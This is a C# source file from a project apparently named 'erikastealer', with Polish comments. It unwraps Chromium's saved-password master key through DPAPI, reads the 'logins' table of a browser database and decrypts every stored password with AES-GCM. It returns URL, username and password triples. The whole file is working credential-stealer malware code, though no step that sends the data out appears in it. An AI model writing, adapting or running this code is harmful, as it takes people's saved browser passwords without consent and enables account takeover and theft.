using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using static erikastealer.EdgeDataExporter;

namespace erikastealer.Helpers
{
    public class DPAPI
    {
        public static byte[] GetChromiumMasterKey(string LocalStatePath)
        {
            if (!File.Exists(LocalStatePath))
                throw new FileNotFoundException("Nie znaleziono pliku Local State", LocalStatePath);

            string localStateContent = File.ReadAllText(LocalStatePath);
            var json = JsonDocument.Parse(localStateContent);
            string encryptedKeyBase64 = json.RootElement.GetProperty("os_crypt").GetProperty("encrypted_key").GetString();
            byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);


            encryptedKey = encryptedKey.Skip(5).ToArray();

            return ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
        }

        public static List<PasswordEntry> ExtractPasswords(string dbPath, byte[] masterKey)
        {
            List<PasswordEntry> passwords = new List<PasswordEntry>();

            using (var connection = new SQLiteConnection($"Data Source={dbPath};Version=3;"))
            {
                connection.Open();

                using (var command = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", connection))
                using (var reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        string url = reader.GetString(0);
                        string username = reader.GetString(1);
                        byte[] encryptedPassword = (byte[])reader["password_value"];
                        byte[] decryptedPassword = DecryptAesGcm(encryptedPassword, masterKey);
                        string decryptedPasswordString = Encoding.UTF8.GetString(decryptedPassword);
                        passwords.Add(new PasswordEntry(url, username, decryptedPasswordString));
                    }
                }
            }

            return passwords;
        }

        public static byte[] DecryptAesGcm(byte[] encryptedBytes, byte[] key)
        {
            try
            {
                // Wyciągnięcie IV (nonce), ciphertext i tag z danych przeglądarki
                byte[] iv = encryptedBytes.Skip(3).Take(12).ToArray(); // IV zawsze 12 bajtów
                byte[] ciphertext = encryptedBytes.Skip(15).Take(encryptedBytes.Length - 31).ToArray(); // dane zaszyfrowane
                byte[] tag = encryptedBytes.Skip(encryptedBytes.Length - 16).ToArray(); // ostatnie 16 bajtów

                // Ustawienie parametrów AES-GCM
                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

                cipher.Init(false, parameters); // false = deszyfrowanie

                byte[] encryptedDataWithTag = ciphertext.Concat(tag).ToArray();
                byte[] decryptedBytes = new byte[cipher.GetOutputSize(encryptedDataWithTag.Length)];

                int len = cipher.ProcessBytes(encryptedDataWithTag, 0, encryptedDataWithTag.Length, decryptedBytes, 0);
                cipher.DoFinal(decryptedBytes, len);

                return decryptedBytes;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[BŁĄD] {ex.Message}");
                return null;
            }


        }


        public class PasswordEntry
        {
            public string Url { get; }
            public string Username { get; }
            public string Password { get; }

            public PasswordEntry(string url, string username, string password)
            {
                Url = url;
                Username = username;
                Password = password;
            }

            public override string ToString()
            {
                return $"{Url}|{Username}|{Password}";
            }
        }
    }
}
